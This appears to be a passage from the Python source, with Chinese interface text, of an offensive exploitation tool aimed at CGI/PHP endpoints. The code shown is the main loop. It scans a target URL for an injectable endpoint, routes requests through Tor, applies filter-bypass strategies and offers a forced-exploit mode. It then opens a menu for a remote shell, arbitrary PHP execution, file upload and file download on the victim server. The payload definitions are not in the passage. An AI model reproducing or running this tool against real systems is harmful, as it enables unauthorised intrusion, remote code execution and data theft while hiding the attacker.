                    rprint("[bold green][*] 延遲時間已更新[/bold green]")
                else:
                    rprint("[red][!] 延遲請輸入 0～10 秒[/red]")
            except:
                rprint("[red][!] 輸入格式錯誤[/red]")

        elif choice == "3":
            state["enable_log"] = not state["enable_log"]
            rprint(f"[bold green][*] Log 已切換為 {'開啟' if state['enable_log'] else '關閉'}[/bold green]")

        elif choice == "4":
            state["VERBOSE_MODE"] = not state["VERBOSE_MODE"]
            rprint(f"[bold green][*] Verbose 已切換為 {'開啟' if state['VERBOSE_MODE'] else '關閉'}[/bold green]")

        elif choice == "5":
            state["disable_effects"] = not state["disable_effects"]
            rprint(f"[bold green][*] 動畫模式已切換為 {'關閉' if state['disable_effects'] else '開啟'}[/bold green]")

        elif choice == "6":
            state["force_mode"] = not state["force_mode"]
            rprint(f"[bold green][*] 強制利用模式已切換為 {'開啟' if state['force_mode'] else '關閉'}[/bold green]")

        elif choice == "7":
            break
        else:
            rprint("[red][!] 無效選項，請重新輸入[/red]")


# main 函數
def main():
    global timeout_value, PAYLOADS, selected_payload_group, VERBOSE_MODE, enable_log, use_tor, tor_session, disable_effects, forced_cgipoints, delay_between_requests

    args = parse_arguments()
    target = args.url
            
    enable_log = args.log
    VERBOSE_MODE = args.verbose
    use_tor = args.tor
    enable_bypass = args.bypass
    force_mode = args.force
    disable_effects = args.no_effects
    forced_cgipoints = args.cgipoint or []
    delay_between_requests = args.delay
    #disable_effects = false

    if disable_effects:
        banner.print_static_banner()
        banner.Show_Disclaimer(no_effects=True)
    else:
        banner.play_banner(use_tor, enable_bypass)
        banner.Show_Disclaimer()
        
    if delay_between_requests > 0:
        rprint("[bold green][*] 已設置 delay 模式[/bold green]")
            
    if args.timeout == 0:
        rprint("[bold green][*] 已設置為無限等待[/bold green]")
    elif args.timeout > 120:
        rprint("[bold red][!] 等待時間過久 (超過 120 秒)，如需要無限等待請使用 --timeout=0[/bold red]")
        sys.exit(1)
    elif args.timeout > 30:
        timeout_value = args.timeout
        rprint("[bold yellow][!] 警告：timeout 超過 30 秒，測試可能會耗時較久[/bold yellow]")
    elif args.timeout < 1:
        rprint("[bold red][!] 錯誤：timeout 必須為 0 或 1~120 之間的整數[/bold red]")
        sys.exit(1)
    else:
        timeout_value = args.timeout
        if args.timeout != 10:
            rprint(f"[bold green][*] 設定請求超時時間為 {timeout_value} 秒[/bold green]")

    if use_tor:
        tor_session = tor_helper.get_tor_session()
        if not tor_session:
            sys.exit(1)

    # Payload選擇邏輯區塊
    generate_payload_groups()

    if args.payload == "C":
        rprint("\n[bold cyan][*] 進入自訂 Payload 模式...[/bold cyan]")
        selected_payload_group = customize_payload()
    elif args.payload and args.payload in PAYLOAD_GROUPS:
        selected_payload_group = args.payload
    elif args.payload:
        rprint("\n[bold yellow][!] 無效或遺漏的 Payload 組合，進入選擇介面[/bold yellow]")
        selected_payload_group, PAYLOADS = show_payload_list()
    else:
        selected_payload_group = "1" #預設

    # 確保 PAYLOADS 一定對應正確
    PAYLOADS = PAYLOAD_GROUPS.get(selected_payload_group, PAYLOAD_GROUPS["1"])

    bypass_modules_selected = []
    bypass_retry_count = 1
    if enable_bypass:
        bypass_modules_selected, bypass_retry_count = interactive_bypass_setup()

    while True:
        selected_cgipoint, selected_payload = None, None
        next_action = None 
        already_scanned_this_round = False
        rprint("[bold green][*] 開始測試...[/bold green]")

        if enable_bypass and bypass_modules_selected:
            rprint("[bold cyan][*][/bold cyan] 已啟用 Bypass 模式，套用以下繞過策略：")
            for name in bypass_modules_selected:
                rprint(f"[cyan]    - {name}[/cyan]")            
            rprint(f"\n[bold cyan][*][/bold cyan] 將重試每組繞過組合 [bold]{bypass_retry_count}[/bold] 次\n")

            selected_cgipoint, selected_payload = run_bypass_mode(
                target,
                bypass_modules_selected,
                bypass_retry_count,
                forced_cgipoints
            )
            already_scanned_this_round = True

        if not already_scanned_this_round:
            for p in PAYLOADS:
                ep = choose_cgipoint(target, p, forced_cgipoints)
                if ep:
                    selected_cgipoint, selected_payload = ep, p
                    break
                    
        fail_menu_first_time = True
        
        if not selected_cgipoint and force_mode:
            rprint("[bold violet][*] 啟用 --force 模式，將強制進入漏洞利用功能選單[/bold violet]\n")
            selected_cgipoint = CGI_POINTS[0]
            selected_payload = list(PAYLOADS.keys())[0]
            
        fail_menu_first_time = True
        
        while not selected_cgipoint:
            next_action = show_fail_menu(
                target,
                selected_payload_group,
                bypass_modules_selected,
                bypass_retry_count,
                forced_cgipoints,
                timeout_value,
                delay_between_requests,
                enable_log,
                VERBOSE_MODE,
                disable_effects,
                force_mode,
                first_round=fail_menu_first_time
            )
            print()
            fail_menu_first_time = False

            # 用 dict 傳入要更新的 state
            menu_state = {
                "target": target,
                "selected_payload_group": selected_payload_group,
                "PAYLOADS": PAYLOADS,
                "enable_bypass": enable_bypass,
                "bypass_modules_selected": bypass_modules_selected,
                "bypass_retry_count": bypass_retry_count,
                "forced_cgipoints": forced_cgipoints,
                "timeout_value": timeout_value,
                "delay_between_requests": delay_between_requests,
                "enable_log": enable_log,
                "VERBOSE_MODE": VERBOSE_MODE,
                "disable_effects": disable_effects,
                "force_mode": force_mode
            }


             # 這裡是handler的呼叫
            result = handle_fail_menu_action(next_action, menu_state)

            # 回收變數
            target = menu_state["target"]
            selected_payload_group = menu_state["selected_payload_group"]
            PAYLOADS = menu_state["PAYLOADS"]
            enable_bypass = menu_state["enable_bypass"]
            bypass_modules_selected = menu_state["bypass_modules_selected"]
            bypass_retry_count = menu_state["bypass_retry_count"]
            forced_cgipoints = menu_state["forced_cgipoints"]
            timeout_value = menu_state["timeout_value"]
            delay_between_requests = menu_state["delay_between_requests"]
            enable_log = menu_state["enable_log"]
            VERBOSE_MODE = menu_state["VERBOSE_MODE"]
            disable_effects = menu_state["disable_effects"]
            force_mode = menu_state["force_mode"]

            if result == "retry":
                break

        if next_action != "4" and not selected_cgipoint:
            continue

        while selected_cgipoint:
            sleep_safe(0.05)
            header = Text(" Exploit 模式選單 ", style="bold cyan")
            body = Text()
            body.append("當前目標：", style="cyan")
            body.append(f"{target}\n", style="sky_blue1")
            body.append("當前注入點：", style="cyan")
            body.append(f"{selected_cgipoint}\n", style="sky_blue1")
            body.append("漏洞編號：", style="cyan")
            body.append(f"{selected_payload}", style="sky_blue1")

            console.print(Panel(body, title=header, border_style="bright_blue", expand=False))

            # 定義選單項目與對應行為
            menu_items = [
                ("1", "🧪 Shell模式", lambda: exploit_shell(target, selected_cgipoint, selected_payload, bypass_modules_selected)),
                ("2", "🛠️ PHP自訂端模式", lambda: custom_php_mode(target, selected_cgipoint, selected_payload, bypass_modules_selected)),
                ("3", "📤 上傳檔案", lambda: upload_file(target, selected_cgipoint, selected_payload, bypass_modules_selected)),
                ("4", "📥 下載檔案", lambda: download_file(target, selected_cgipoint, selected_payload, bypass_modules_selected)),
                ("5", "🎯 切換攻擊目標", "switch_target"),
                ("6", "⚙️ 設定參數", "settings"),
                ("7", "❌ 離開程式", "exit")
            ]

            for idx, desc, _ in menu_items:
                sleep_safe(0.07)
                rprint(f"[cyan]{idx})[/cyan] {desc}")

            choice = input(">> ").strip()
            print()

            matched = next((item for item in menu_items if item[0] == choice), None)

            if matched:
                action = matched[2]
                if callable(action):
                    action()
                elif action == "switch_target":
                    target = input("輸入新目標URL: ").strip()
                    print()
                    break  # 跳出迴圈重新掃描目標
                elif action == "settings":
                    # 建立設定狀態 dict 傳入
                    state = {
                        "selected_payload_group": selected_payload_group,
                        "bypass_modules_selected": bypass_modules_selected,
                        "timeout_value": timeout_value,
                        "delay_between_requests": delay_between_requests,
                        "enable_log": enable_log,
                        "VERBOSE_MODE": VERBOSE_MODE,
                        "disable_effects": disable_effects,
                        "force_mode": force_mode,
                        "PAYLOADS": PAYLOADS
                    }

                    exploit_settings_menu(state)

                    # 回寫更新後參數
                    selected_payload_group = state["selected_payload_group"]
                    bypass_modules_selected = state["bypass_modules_selected"]
                    timeout_value = state["timeout_value"]
                    delay_between_requests = state["delay_between_requests"]
                    enable_log = state["enable_log"]
                    VERBOSE_MODE = state["VERBOSE_MODE"]
                    disable_effects = state["disable_effects"]
                    force_mode = state["force_mode"]
                    PAYLOADS = state["PAYLOADS"]

                elif action == "exit":
                    rprint("[bold yellow][*] 程式結束[/bold yellow]")
                    sys.exit(0)
            else:
                rprint("[bold red][!] 無效的選擇，請重新選擇[/bold red]\n")

if __name__ == "__main__":
    main()




